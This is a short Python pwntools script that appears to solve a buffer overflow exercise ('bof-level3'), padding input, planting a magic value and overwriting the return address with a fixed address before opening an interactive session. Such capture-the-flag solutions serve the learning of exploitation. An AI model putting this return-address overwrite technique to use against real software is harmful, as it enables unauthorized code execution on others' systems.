#!/usr/bin/env python

from pwn import *

p = process('./bof-level3')

print(p.recv())

buffer = "A" * 32
buffer += "ABCDEFGHabcdefgh"
buffer += "A" * 8
buffer += p64(0x4006e0)

p.sendline(buffer)

p.interactive()
